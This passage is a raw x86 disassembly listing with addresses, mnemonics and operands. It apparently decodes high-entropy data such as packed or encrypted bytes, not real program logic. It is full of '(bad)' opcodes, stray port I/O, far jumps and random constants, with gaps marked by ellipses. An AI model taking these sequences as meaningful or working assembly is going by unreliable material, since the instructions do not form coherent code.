  418597:	pop    ebx
  418598:	cld    
  418599:	pcmpgtd mm1,QWORD PTR [ebx]
  41859c:	push   esi
  41859d:	pop    es
  41859e:	push   esp
  41859f:	cmp    BYTE PTR [esi],bl
  4185a1:	lods   eax,DWORD PTR ds:[esi]
  4185a2:	lods   al,BYTE PTR ds:[esi]
  4185a3:	inc    ebp
  4185a4:	loopne 0x41852b
  4185a6:	lods   eax,DWORD PTR ds:[esi]
  4185a7:	mov    al,0x6d
  4185a9:	lods   al,BYTE PTR ds:[esi]
  4185aa:	push   eax
  4185ab:	jecxz  0x4185d9
  4185ad:	retf   
  4185ae:	push   0xffffff89
  4185b0:	add    eax,0x3781950e
  4185b5:	das    
  4185b6:	mov    dl,0x7c
  4185b8:	sahf   
  4185b9:	jg     0x4185b3
  4185bb:	in     al,0xa7
  4185bd:	mov    fs,edi
  4185bf:	(bad)  
  4185c0:	popa   
  4185c1:	or     eax,0xd86eec4b
  4185c6:	sahf   
  4185c7:	cmp    DWORD PTR [eax+0x76],edx
  4185ca:	mov    dl,0x3c
  4185cc:	adc    al,0xd9
  4185ce:	call   ecx
  4185d0:	mov    al,0x26
  4185d2:	ins    DWORD PTR es:[edi],dx
  4185d3:	push   es
  4185d4:	push   edi
  4185d5:	pop    ecx
  4185d6:	xor    al,0x7c
  4185d8:	rcr    cl,1
  4185da:	and    DWORD PTR [esi-0x11aa2c3f],ebp
  4185e0:	pcmpgtb mm4,QWORD PTR ds:0xf37ab4be
  4185e7:	ret    
  4185e8:	push   esi
  4185e9:	fisubr WORD PTR [ecx-0x14]
  4185ec:	test   DWORD PTR [esi-0x71eef393],ebx
  4185f2:	cmc    
  4185f3:	jno    0x4185fb
  4185f5:	mov    ds:0xf9f1a3e5,eax
  4185fa:	(bad)  
  4185fc:	sahf   
  4185fd:	pop    ds
  4185fe:	cmp    DWORD PTR [edi+0x35],ebx
  418601:	shr    ecx,0x17
  418604:	push   esi
  418605:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  418607:	iret   
  418608:	push   ss
  418609:	fsubr  QWORD PTR [eax-0x18]
  41860c:	xchg   edi,eax
  41860d:	mov    esi,0xa5989725
  418612:	fnstenv [edi+ebp*1+0x77]
  418616:	push   es
  418617:	cs mov dl,0x3
  41861a:	test   al,0x60
  41861c:	fist   DWORD PTR [esi+0x166c6b1]
  418622:	ins    DWORD PTR es:[edi],dx
  418623:	mov    ebx,0x6c19a6d1
  418628:	jne    0x418631
  41862a:	cs popf 
  41862c:	add    dh,BYTE PTR [edx]
  41862e:	push   ss
  41862f:	test   DWORD PTR [esi+0x5b],ebx
  418632:	int3   
  418633:	ret    
  418634:	mov    bl,0x83
  418636:	or     al,0x47
  418638:	sbb    al,0xce
  41863a:	push   esp
  41863b:	retf   
  41863c:	div    BYTE PTR [ebx+0x4f]
  41863f:	aaa    
  418640:	inc    edx
  418641:	mov    esp,DWORD PTR [edx]
  418643:	mov    edi,0x66b1bf61
  418648:	out    dx,al
  418649:	xchg   BYTE PTR [ecx],bh
  41864b:	retf   
  41864c:	jge    0x418672
  41864e:	retf   0xceb4
  418651:	inc    ebp
  418652:	mov    DWORD PTR [ecx+edx*4-0x6b],eax
  418656:	and    ebx,eax
  418658:	mov    esi,0x9cf2675b
  41865d:	outs   dx,DWORD PTR ds:[esi]
  41865e:	or     ecx,ebx
  418660:	sbb    ebx,edx
  418662:	jns    0x418639
  418664:	loop   0x4186b3
  418666:	(bad)  
  418667:	cwde   
  418668:	out    dx,eax
  418669:	js     0x4185ee
  41866b:	push   es
  41866c:	cmc    
  41866d:	mov    esi,edx
  41866f:	push   es
  418670:	sub    al,0xb7
  418672:	iret   
  418673:	cmp    dl,dh
  418675:	(bad)  
  418677:	mov    WORD PTR [ebp-0x2fb1581c],gs
  41867d:	cmc    
  41867e:	mov    ah,0x2
  418680:	inc    bx
  418682:	push   ds
  418683:	sbb    eax,0x5d40579
  418688:	pusha  
  418689:	push   0x5150a280
  41868e:	(bad)  
  41868f:	aad    0xaf
	...
  4186f1:	add    BYTE PTR [eax],al
  4186f3:	add    BYTE PTR [ebx-0x44c35fd8],dl
  4186f9:	mov    esp,0x8d0caf9f
  4186fe:	cmp    edx,edx
  418700:	mov    ebx,0xcc133c38
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR ds:0xa7000001,al
  41870d:	and    al,0xfe
  41870f:	mov    dh,0xf3
  418711:	fmul   DWORD PTR [edi+edi*1-0x7f]
  418715:	add    ebp,esp
  418717:	sbb    eax,0x84110ee3
  41871c:	jmp    0xef48:0xdb0b962c
  418723:	sub    eax,0x3ba4c540
  418728:	(bad)  
  418729:	int    0xf
  41872b:	gs in  eax,dx
  41872d:	jmp    0x418706
  41872f:	push   ecx
  418730:	loopne 0x41872a
  418732:	cmp    BYTE PTR ds:0xa49e1f3e,bh
  418738:	out    dx,eax
  418739:	js     0x41870c
  41873b:	sbb    BYTE PTR [ecx],0x50
  41873e:	js     0x418754
  418740:	call   0xdb3d246d
  418745:	push   ss
  418746:	(bad)  
  418747:	cld    
  418748:	add    al,0x1f
  41874a:	(bad)  
  41874c:	mov    ebx,0xe14517d7
  418751:	(bad)  
  418752:	(bad)  
  418753:	mov    edx,0xb4c3e821
  418758:	retf   
  418759:	dec    esp
  41875a:	mov    ah,0x73
  41875c:	fs sbb esp,ecx
  41875f:	pop    eax
  418760:	xchg   ax,ax
  418762:	jge    0x418776
  418764:	daa    
  418765:	sub    eax,0x576ab552
  41876a:	out    0xcb,eax
  41876c:	outs   dx,BYTE PTR ds:[esi]
  41876d:	inc    esp
  41876e:	daa    
  41876f:	mov    edx,0x1c4c7269
  418774:	jp     0x418736
  418776:	adc    edi,edi
  418778:	xchg   ebx,eax
  418779:	mov    BYTE PTR gs:[esp+ebx*8-0x4f],dl
  41877e:	stc    
  41877f:	cdq    
  418780:	arpl   WORD PTR [eax+esi*8],di
  418783:	int3   
  418784:	out    0x31,eax
  418786:	mov    ds:0x1b8907ac,eax
  41878b:	sub    ecx,ecx
  41878d:	(bad)  
  41878e:	push   ebx
  41878f:	push   ss
  418790:	mov    eax,0x13ae799c
  418795:	mov    edx,0x385ede75
  41879a:	pop    edx
  41879b:	or     esi,DWORD PTR [ebx+0x63]
  41879e:	js     0x41874a
  4187a0:	outs   dx,DWORD PTR ds:[esi]
  4187a1:	test   eax,0x41b22874
  4187a6:	jge    0x418766
  4187a8:	adc    al,0x24
  4187aa:	in     al,dx
  4187ab:	inc    esi
  4187ac:	lock shr DWORD PTR [ecx*1-0x16d6f8e7],cl
  4187b4:	sar    DWORD PTR [eax],cl
  4187b6:	cmc    
  4187b7:	and    al,0xd4
  4187b9:	ret    0xc0a4
  4187bc:	retf   0x27a5
  4187bf:	(bad)  
  4187c0:	aad    0x45
  4187c2:	push   es
  4187c3:	jae    0x418748
  4187c5:	ror    DWORD PTR [edi-0x5a],0xde
  4187c9:	fild   DWORD PTR ds:0xb56de695
  4187cf:	jp     0x418801
  4187d1:	cmp    esp,DWORD PTR [edi]
  4187d3:	dec    esp
  4187d4:	push   0xffffffbc
  4187d6:	inc    edx
  4187d7:	xchg   ecx,eax
  4187d8:	scas   eax,DWORD PTR es:[edi]
  4187d9:	ret    0x2bce
  4187dc:	jno    0x41881e
  4187de:	or     bh,BYTE PTR [edx+0x67]
  4187e1:	sbb    ebx,DWORD PTR [ebx+edi*1]
  4187e4:	scas   eax,DWORD PTR es:[edi]
  4187e5:	ficom  WORD PTR [eax+0x1a]
  4187e8:	or     esi,DWORD PTR [ecx+ebp*8]
  4187eb:	fisttp DWORD PTR [esi+0x46]
  4187ee:	and    DWORD PTR [edx-0x33],edx
  4187f1:	(bad)  [esi-0x79]
  4187f4:	les    edi,FWORD PTR es:[eax+0x8]
  4187f8:	push   ds
  4187f9:	test   al,0x64
  4187fb:	add    al,0xac
  4187fd:	sbb    bh,BYTE PTR [ebp+0x7e]
  418800:	fdiv   QWORD PTR [esi+edi*2+0x15]
  418804:	std    
  418805:	pop    eax
  418806:	pusha  
  418807:	int    0xeb
  418809:	imul   esp,DWORD PTR [ebx],0x4
  41880c:	and    al,0x33
  41880e:	pop    ebx
  41880f:	push   esi
  418810:	xchg   esp,eax
	...
  418871:	add    BYTE PTR [eax],al
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi-0x3163c533]
  418881:	push   ds
  418882:	pusha  
  418883:	stc    
  418884:	rol    DWORD PTR [ebx],1
  418886:	add    DWORD PTR [eax],eax
  418888:	add    eax,0x27000001
  41888d:	push   esp
  41888e:	inc    ecx
  41888f:	outs   dx,BYTE PTR ds:[esi]
  418890:	fstp   TBYTE PTR [esi]
  418892:	lods   eax,DWORD PTR ds:[esi]
  418893:	dec    ebx
  418894:	addr16 dec ecx
  418896:	mov    eax,ds:0xaf48d85e
  41889b:	add    al,0x5d
  41889d:	and    ebx,0x3c
  4188a0:	(bad)  
  4188a1:	pop    esi
  4188a2:	out    0x61,al
  4188a4:	hlt    
  4188a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188a6:	not    DWORD PTR [ebp-0x75ddd946]
  4188ac:	jbe    0x418841
  4188ae:	hlt    
  4188af:	adc    DWORD PTR [ecx-0x5396898e],ebx
  4188b5:	leave  
  4188b6:	adc    al,0x31
  4188b8:	mov    DWORD PTR [esp+eax*8],edx
  4188bb:	inc    esi
  4188bc:	jecxz  0x418859
  4188be:	(bad)  
  4188bf:	fcom   DWORD PTR [ebx]
  4188c1:	dec    esi
  4188c2:	lods   al,BYTE PTR ds:[esi]
  4188c3:	and    DWORD PTR [ebp-0x3b],0x3a5cc317
  4188ca:	out    dx,eax
  4188cb:	inc    edi
  4188cc:	mov    eax,0xc3b9d0ca
  4188d1:	les    ebx,FWORD PTR [eax]
  4188d3:	mov    ecx,0x41348e10
  4188d8:	add    edx,DWORD PTR [esp+ebx*8-0x157fb976]
  4188df:	pusha  
  4188e0:	adc    eax,0xbd647531
  4188e5:	(bad)  
  4188e6:	rsqrtps xmm0,xmm3
  4188e9:	loop   0x4188e8
  4188eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188ec:	lahf   
  4188ed:	outs   dx,BYTE PTR ds:[esi]
  4188ee:	frstor ds:0xea4d1a4a
  4188f4:	mov    dh,0x15
  4188f6:	retf   
  4188f7:	push   ds
  4188f8:	pop    ebx
  4188f9:	and    ebx,DWORD PTR [edx-0xe8a75dd]
  4188ff:	iret   
  418900:	pop    ss
  418901:	shl    DWORD PTR [eax+0x6d],cl
  418904:	push   edi
  418905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418906:	pushf  
  418907:	(bad)  
  418908:	inc    ebp
  418909:	out    0x30,eax
  41890b:	lods   al,BYTE PTR ds:[esi]
  41890c:	push   edx
  41890d:	js     0x418986
  41890f:	mov    bl,0x3d
  418911:	dec    esp
  418912:	bound  ecx,QWORD PTR [ebx+0x7c76eab9]
  418918:	jns    0x41894e
  41891a:	mov    ds,WORD PTR [edi+0x10]
  41891d:	stc    
  41891e:	push   cs
  41891f:	sbb    BYTE PTR [ecx-0x52164b54],ch
  418925:	adc    BYTE PTR [edx+0x45],dh
  418928:	cmc    
  418929:	mov    ds:0xd366b819,al
  41892e:	(bad)  
  41892f:	mov    al,BYTE PTR [eax+0x4a7c0c16]
  418935:	icebp  
  418936:	pop    esp
  418937:	and    al,0xd8
  418939:	dec    eax
  41893a:	xor    DWORD PTR [ecx+esi*8],ebx
  41893d:	test   BYTE PTR [ebx+ebp*8],dl
  418940:	mov    esp,0x4a6051e3
  418945:	cld    
  418946:	mov    esp,0x8d57fbdf
  41894b:	sbb    DWORD PTR [edx+0x69],edx
  41894e:	inc    edi
  41894f:	int3   
  418950:	and    ch,BYTE PTR [edi+0x297446ec]
  418956:	ror    DWORD PTR [esi-0x57],1
  418959:	xchg   edi,eax
  41895a:	pop    esp
  41895b:	inc    esi
  41895c:	test   DWORD PTR [esp+eax*8],edx
  41895f:	add    eax,0xa6ea7672
  418964:	out    0xbc,eax
  418966:	clc    
  418967:	jl     0x4188ec
  418969:	xchg   esi,eax
  41896a:	mov    ds:0xff717513,al
  41896f:	sti    
  418970:	adc    ebx,DWORD PTR [ebx+ecx*2]
  418973:	add    bh,bl
  418975:	inc    esi
  418976:	sti    
  418977:	mov    dl,0xbb
  418979:	dec    ecx
  41897a:	jns    0x4189a9
  41897c:	ret    0x9abf
  41897f:	mov    WORD PTR [esi+0x3c],ds
  418982:	pop    ebp
  418983:	sbb    BYTE PTR [edi-0x3b],bh
  418986:	adc    esi,ecx
  418988:	inc    edi
  418989:	jns    0x418966
  41898b:	lahf   
  41898c:	sbb    BYTE PTR [ebx],0x3f
  41898f:	or     ah,cl
	...
  4189f1:	add    BYTE PTR [eax],al
  4189f3:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0x42f71769
  418a03:	ds (bad) 
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR ds:0xd9000001,al
  418a0d:	mov    DWORD PTR [eax],edi
  418a0f:	loop   0x4189c9
  418a11:	jo     0x4189c8
  418a13:	sub    dl,BYTE PTR [eax+0x1d006a68]
  418a19:	into   
  418a1a:	sbb    BYTE PTR [ecx+0xd723b18],ch
  418a20:	js     0x4189c3
  418a22:	cs xor eax,0xa5e1367f
  418a28:	lods   al,BYTE PTR ds:[esi]
  418a29:	push   0xfebe215b
  418a2e:	dec    edx
  418a2f:	mov    dh,0xa7
  418a31:	pop    sp
  418a33:	fwait
  418a34:	les    edx,FWORD PTR [eax-0x3c3f844b]
  418a3a:	jae    0x418a82
  418a3c:	sub    ebp,DWORD PTR [edx]
  418a3e:	cmc    
  418a3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a40:	test   eax,0x5fbb4dde
  418a45:	dec    eax
  418a46:	xchg   ebp,eax
  418a47:	nop
  418a48:	ja     0x418a99
  418a4a:	dec    ebx
  418a4b:	shl    DWORD PTR [esi+0x2590f09c],0x68
  418a52:	test   al,bh
  418a54:	xor    al,0xd
  418a56:	or     DWORD PTR [eax-0x56],0x70
  418a5a:	push   esi
  418a5b:	xchg   BYTE PTR [eax+0x7ec60761],bh
  418a61:	(bad)  
  418a63:	pop    edi
  418a64:	adc    ecx,ebp
  418a66:	xchg   ebx,eax
  418a67:	or     BYTE PTR [ebx-0x581d5807],al
  418a6d:	not    DWORD PTR [ecx-0x2b]
  418a70:	lock test al,0x9e
  418a73:	xchg   ebp,eax
  418a74:	push   ecx
  418a75:	jbe    0x418a6e
  418a77:	test   eax,0x225231c8
  418a7c:	mov    ebp,ebp
  418a7e:	test   DWORD PTR [edx+esi*8+0x3],ebp
  418a82:	sub    DWORD PTR [edx],ebp
  418a84:	jns    0x418aad
  418a86:	cmp    ebx,esp
  418a88:	pop    gs
  418a8a:	(bad)
  418a8e:	sbb    BYTE PTR [ebp+0x2b],dh
  418a91:	std    
  418a92:	std    
  418a93:	and    DWORD PTR [edx],0x69161f8c
  418a99:	jg     0x418a95
  418a9b:	(bad)  
  418a9c:	inc    eax
  418a9d:	or     eax,0x21e8d0e9
  418aa2:	jmp    0x418a7c
  418aa4:	dec    eax
  418aa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aa6:	ror    DWORD PTR [edx+edx*8],0x7
  418aaa:	addr16 sti 
  418aac:	sbb    eax,0xb9899f8d
  418ab1:	dec    ecx
  418ab2:	enter  0xf5dd,0x8d
  418ab6:	ficomp WORD PTR [edi+0x6c]
  418ab9:	out    0xba,al
  418abb:	inc    esi
  418abc:	xor    bl,al
  418abe:	dec    esp
  418abf:	mov    bl,0x32
  418ac1:	push   ebx
  418ac2:	mov    ds:0x40fc62f6,al
  418ac7:	sub    ah,BYTE PTR [esi+0x75]
  418aca:	rcr    BYTE PTR [ebx+0x57],1
  418acd:	ins    DWORD PTR es:[edi],dx
  418ace:	pop    ecx
  418acf:	fsubr  DWORD PTR [ebx+0x632b776e]
  418ad5:	mov    DWORD PTR [ecx],eax
  418ad7:	std    
  418ad8:	ins    BYTE PTR es:[edi],dx
  418ad9:	fwait
  418ada:	cmp    BYTE PTR [edx+ebp*2],dh
  418add:	push   ebx
  418ade:	test   eax,0xfc22b028
  418ae3:	nop
  418ae4:	iret   
  418ae5:	mov    esi,0x68299eb6
  418aea:	sub    al,0x4
  418aec:	call   0x13cb0c8d
  418af1:	mov    cl,0x28
  418af3:	pop    ecx
  418af4:	loope  0x418b0b
  418af6:	iret   
  418af7:	jne    0x418b07
  418af9:	cs push 0xffffff9d
  418afc:	aaa    
  418afd:	(bad)  
  418aff:	jg     0x418a9d
  418b01:	jo     0x418abf
  418b03:	test   DWORD PTR [edx+esi*4+0x37],0xbda59811
  418b0b:	inc    edx
  418b0c:	stc    
  418b0d:	mov    edi,0xe904e4
	...
  418b72:	add    BYTE PTR [eax],al
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xdc
  418b81:	adc    esi,DWORD PTR [eax+0x105db7c]
  418b87:	add    BYTE PTR ds:0xa2000001,al
  418b8d:	push   ebx
  418b8e:	and    DWORD PTR [ebp+0x76],esp
  418b91:	adc    ecx,DWORD PTR [edx-0x3d]
  418b94:	push   eax
  418b95:	scas   al,BYTE PTR es:[edi]
  418b96:	imul   BYTE PTR [esi]
  418b98:	fwait
  418b99:	scas   al,BYTE PTR es:[edi]
  418b9a:	xlat   BYTE PTR ds:[ebx]
  418b9b:	rol    dh,0x14
  418b9e:	stos   DWORD PTR es:[edi],eax
  418b9f:	push   ss
  418ba0:	stc    
  418ba1:	leave  
  418ba2:	dec    edi
  418ba3:	dec    esi
  418ba4:	xlat   BYTE PTR ds:[ebx]
  418ba5:	mov    ebx,0x992d73f7
  418baa:	sub    al,0x8b
  418bac:	or     al,0xaa
  418bae:	jb     0x418bcd
  418bb0:	push   ebx
  418bb1:	push   esp
  418bb2:	sub    al,0xd5
  418bb4:	(bad)  
  418bb5:	mov    ah,0xbd
  418bb7:	out    dx,al
  418bb8:	dec    edx
  418bb9:	pop    ds
  418bba:	int3   
  418bbb:	stos   DWORD PTR es:[edi],eax
  418bbc:	sub    BYTE PTR [edx],0xdb
  418bbf:	sbb    al,0x18
  418bc1:	mov    eax,0x5b188d7e
  418bc6:	hlt    
  418bc7:	cwde   
  418bc8:	sbb    BYTE PTR [edi+0x49],ch
  418bcb:	add    eax,DWORD PTR [ebp+ecx*2+0x13]
  418bcf:	mov    al,0xcf
  418bd1:	enter  0x1dbd,0xcb
  418bd5:	je     0x418be3
  418bd7:	in     al,0x5
  418bd9:	(bad)  
  418bda:	rcr    dh,0xeb
  418bdd:	pusha  
  418bde:	fs (bad) 
  418be1:	add    DWORD PTR [eax+0x5e],esp
  418be4:	jg     0x418bbe
  418be6:	sbb    al,0xd6
  418be8:	pushf  
  418be9:	stos   BYTE PTR es:[edi],al
  418bea:	dec    ecx
  418beb:	sub    ah,BYTE PTR [esi+ebp*1-0x72]
  418bef:	aam    0x5
  418bf1:	or     cl,BYTE PTR [esi-0x6071c86d]
  418bf7:	mov    edi,0xe9505c9b
  418bfc:	into   
  418bfd:	xchg   ecx,eax
  418bfe:	fistp  QWORD PTR [ebp-0x4d5c1cb6]
  418c04:	add    al,0xf1
  418c06:	push   edi
  418c07:	mov    bl,0x41
  418c09:	mov    dl,0xd8
  418c0b:	hlt    
  418c0c:	clc    
  418c0d:	leave  
  418c0e:	xchg   ebx,eax
  418c0f:	int    0x6c
  418c11:	add    al,0xd7
  418c13:	out    0x9a,eax
  418c15:	push   ebp
  418c16:	mov    edx,0x4275f02f
  418c1b:	addr16 jno 0x418c0e
  418c1e:	dec    eax
  418c1f:	jne    0x418c2f
  418c21:	je     0x418c8c
  418c23:	dec    esp
  418c24:	add    BYTE PTR [edx-0x6c],dl
  418c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c28:	jbe    0x418c4f
  418c2a:	or     BYTE PTR [esi+0x9a8cc07],bh
  418c30:	add    esp,esi
  418c32:	enter  0x4906,0xa1
  418c36:	dec    ebp
  418c37:	scas   al,BYTE PTR es:[edi]
  418c38:	inc    ebx
  418c39:	mov    esi,?
  418c3b:	mov    bl,0x9d
  418c3d:	fidivr DWORD PTR [esi+0x20]
  418c40:	les    edi,FWORD PTR [ecx+0x12b598c7]
  418c46:	xor    al,0x2b
  418c48:	or     al,0x97
  418c4a:	(bad)  
  418c4b:	pop    eax
  418c4c:	push   ss
  418c4d:	dec    edx
  418c4e:	dec    ecx
  418c4f:	sti    
  418c50:	mov    al,ds:0x582b8532
  418c55:	add    al,0xfb
  418c57:	es out 0x86,al
  418c5a:	rcr    BYTE PTR [edi+eiz*4+0x4c],1
  418c5e:	out    dx,eax
  418c5f:	add    esp,DWORD PTR [ecx+eax*8]
  418c62:	ficom  DWORD PTR [esi+edx*1+0x1a]
  418c66:	data16 clc 
  418c68:	daa    
  418c69:	xchg   esi,eax
  418c6a:	sub    edx,esp
  418c6c:	mov    al,0x24
  418c6e:	cmp    eax,ebx
  418c70:	sub    esp,edi
  418c72:	and    ch,BYTE PTR [ecx]
  418c74:	jb     0x418c96
  418c76:	enter  0xfcb,0xfc
  418c7a:	fsubr  DWORD PTR [ebx+0x27]
  418c7d:	xor    eax,0x2843b738
  418c82:	push   esi
  418c83:	mov    al,0x9c
  418c85:	mov    esi,0x4b746ea
  418c8a:	cmp    al,0x6a
  418c8c:	sbb    DWORD PTR [ecx-0xc],esi
  418c8f:	jae    0x418c4d
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	shl    BYTE PTR [ebx],cl
  418d01:	dec    eax
  418d02:	es shl al,0x6
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    eax,0x1000001
  418d0d:	fwait
  418d0e:	and    al,0xfe
  418d10:	mov    bh,0x14
  418d12:	popa   
  418d13:	je     0x418cb3
  418d15:	shl    ebx,cl
  418d17:	pop    ebp
  418d18:	sbb    eax,0xcd72792a
  418d1d:	jbe    0x418d13
  418d1f:	or     eax,0xfb68c80f
  418d24:	(bad)  
  418d25:	pop    esi
  418d26:	in     eax,0xb6
  418d28:	cmp    al,0x3f
  418d2a:	jmp    0xa696:0xd580a2fe
  418d31:	js     0x418cef
  418d33:	dec    esi
  418d34:	push   edi
  418d35:	popa   
  418d36:	jmp    0x3c01db85
  418d3b:	shr    DWORD PTR [ebp+esi*1-0xd],0xeb
  418d40:	js     0x418da1
  418d42:	sub    edi,DWORD PTR [edx]
  418d44:	lods   eax,DWORD PTR ds:[esi]
  418d45:	jmp    0xc9b2:0xbba37626
  418d4c:	loopne 0x418dab
  418d4e:	repz or BYTE PTR [edi-0x7],ch
  418d52:	inc    edx
  418d53:	jno    0x418d4f
  418d55:	add    ch,BYTE PTR [eax-0x76d3bc2f]
  418d5b:	es jmp 0x418da9
  418d5e:	add    BYTE PTR [eax-0xa],0xfb
  418d62:	push   ebx
  418d63:	test   BYTE PTR [eax+0x40],0xce
  418d67:	div    DWORD PTR [ecx-0x29]
  418d6a:	cwde   
  418d6b:	mov    ecx,0x8cccbdf3
  418d70:	loopne 0x418daf
  418d72:	xchg   ecx,eax
  418d73:	ror    eax,0x25
  418d76:	and    edi,DWORD PTR [esi-0x1f]
  418d79:	stos   DWORD PTR es:[edi],eax
  418d7a:	sub    BYTE PTR [esp+eiz*4],ah
  418d7d:	inc    edi
  418d7e:	jbe    0x418d53
  418d80:	jl     0x418d9c
  418d82:	bound  edi,QWORD PTR [esi-0x46]
  418d85:	fld    DWORD PTR [edi-0x5936d34]
  418d8b:	cmp    eax,0x59b02e38
  418d90:	test   dl,bh
  418d92:	inc    edi
  418d93:	xchg   edx,eax
  418d94:	dec    edx
  418d95:	jge    0x418e03
  418d97:	fst    QWORD PTR [ebx+eax*4-0x74a4cb5a]
  418d9e:	test   BYTE PTR [edx],dh
  418da0:	loopne 0x418dee
  418da2:	test   BYTE PTR [eax-0x1cec656d],al
  418da8:	dec    edi
  418da9:	cmp    ah,BYTE PTR [ebx-0x4588c8cb]
  418daf:	out    dx,eax
  418db0:	push   esp
  418db1:	add    edx,DWORD PTR [ecx-0x44580328]
  418db7:	(bad)  
  418db9:	jle    0x418db6
  418dbb:	sub    al,0x5
  418dbd:	xor    ebx,DWORD PTR [esp+edx*1-0x7eb46a56]
  418dc4:	lahf   
  418dc5:	pop    ds
  418dc6:	stc    
  418dc7:	inc    eax
  418dc8:	and    al,0x58
  418dca:	mov    bl,0x6d
  418dcc:	mov    WORD PTR [ebx+ecx*2],?
  418dcf:	xor    DWORD PTR [edi+edi*4+0x1116ba74],ecx
  418dd6:	std    
  418dd7:	add    ah,BYTE PTR [eax+0x5d33de0c]
  418ddd:	(bad)  
  418dde:	loopne 0x418e0b
  418de0:	ror    DWORD PTR [edi-0x2],1
  418de3:	mov    cl,0x9c
  418de5:	adc    al,0xca
  418de7:	and    ebx,edx
  418de9:	inc    esi
  418dea:	and    bh,ch
  418dec:	jae    0x418e2d
  418dee:	in     al,0x99
  418df0:	and    al,0x81
  418df2:	sbb    BYTE PTR ds:0xeff5e973,ch
  418df8:	cmp    al,0x3a
  418dfa:	(bad)  
  418dfb:	sar    BYTE PTR [edi],cl
  418dfd:	pop    es
  418dfe:	push   esi
  418dff:	(bad)
  418e03:	pop    eax
  418e04:	ins    BYTE PTR es:[edi],dx
  418e05:	cwde   
  418e06:	in     al,0x3d
  418e08:	cmp    cl,BYTE PTR [edi+0x7081a7ca]
  418e0e:	lods   al,BYTE PTR ds:[esi]
  418e0f:	pop    ebp
  418e10:	cld    
	...
  418e71:	add    BYTE PTR [eax],al
  418e73:	add    BYTE PTR [esi],cl
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x33]
  418e81:	sub    BYTE PTR [ebp+0x107e5f2],bl
  418e87:	add    BYTE PTR ds:0x49000001,al
  418e8d:	mov    esp,0x6162239e
  418e92:	mov    edx,edx
  418e94:	or     BYTE PTR [edx+0xf],bh
  418e97:	(bad)  
  418e98:	out    0x96,eax
  418e9a:	imul   esi,DWORD PTR [ecx-0x3b],0x39155107
  418ea1:	xor    al,ah
  418ea3:	cdq    
  418ea4:	fdivr  QWORD PTR [ebx+edx*2+0x4a]
  418ea8:	adc    dh,ah
  418eaa:	xor    eax,0x764e0239
  418eaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418eb0:	nop
  418eb1:	jno    0x418f24
  418eb3:	pop    edi
  418eb4:	gs cs dec esi
  418eb7:	into   
  418eb8:	leave  
  418eb9:	arpl   WORD PTR [di+0x1f87],cx
  418ebe:	sub    edx,DWORD PTR [ebp+ebx*8-0xc7e038e]
  418ec5:	mov    WORD PTR [ebx-0x24bd50b0],ss
  418ecb:	loopne 0x418f0a
  418ecd:	addr16 xchg ebp,eax
  418ecf:	aad    0x8e
  418ed1:	or     DWORD PTR [esi-0x73],edx
  418ed4:	int3   
  418ed5:	jno    0x418e94
  418ed7:	add    al,BYTE PTR [edx-0x3a]
  418eda:	fdivrp st(3),st
  418edc:	enter  0x7f8,0xdb
  418ee0:	clc    
  418ee1:	mov    BYTE PTR [ebx+0x6b],al
  418ee4:	and    DWORD PTR [eax-0x35d8be46],edx
  418eea:	adc    ebp,esi
  418eec:	int    0x22
  418eee:	cmp    ch,ch
  418ef0:	jb     0x418eb0
  418ef2:	and    BYTE PTR [eax+0x68cd169f],dl
  418ef8:	inc    eax
  418ef9:	shl    DWORD PTR [ebp+0x66],cl
  418efc:	mov    dh,0x41
  418efe:	sub    bl,BYTE PTR [esi-0x6c]
  418f01:	test   al,0x2d
  418f03:	pushf  
  418f04:	fsubr  QWORD PTR [eax+0x27]
  418f07:	outs   dx,BYTE PTR ds:[esi]
  418f08:	pop    esp
  418f09:	loope  0x418edc
  418f0b:	inc    ecx
  418f0c:	repnz adc al,0xc0
  418f0f:	js     0x418f49
  418f11:	adc    BYTE PTR [edi],0xf3
  418f14:	mov    ebx,0xd6a9e8ee
  418f19:	mov    cl,0x96
  418f1b:	(bad)  
  418f1d:	out    dx,al
  418f1e:	daa    
  418f1f:	cmp    esi,DWORD PTR [esp+ecx*8+0xfbbf4c3]
  418f26:	mov    bh,0x99
  418f28:	mov    bh,0xc9
  418f2a:	xchg   ebp,eax
  418f2b:	mov    ecx,0x7b0b36e9
  418f30:	out    dx,al
  418f31:	clc    
  418f32:	mov    esp,0x8232983c
  418f37:	jb     0x418f75
  418f39:	(bad)  
  418f3a:	sbb    DWORD PTR [ebx+eax*2-0x29ff3f1d],ecx
  418f41:	xchg   ebp,eax
  418f42:	mov    edx,0x7f9bb354
  418f47:	xchg   esi,eax
  418f48:	pop    eax
  418f49:	mov    ah,0x49
  418f4b:	mov    edx,0x3e393660
  418f50:	mov    bh,0xad
  418f52:	test   BYTE PTR [esp+ecx*2-0x69913e6c],dl
  418f59:	mov    esp,0xfe20b368
  418f5e:	ins    BYTE PTR es:[edi],dx
  418f5f:	fnsave [ebx]
  418f61:	fwait
  418f62:	cmp    al,0x8a
  418f64:	out    0x79,eax
  418f66:	mov    dl,0x63
  418f68:	lds    ecx,FWORD PTR [ecx-0x67]
  418f6b:	inc    ebx
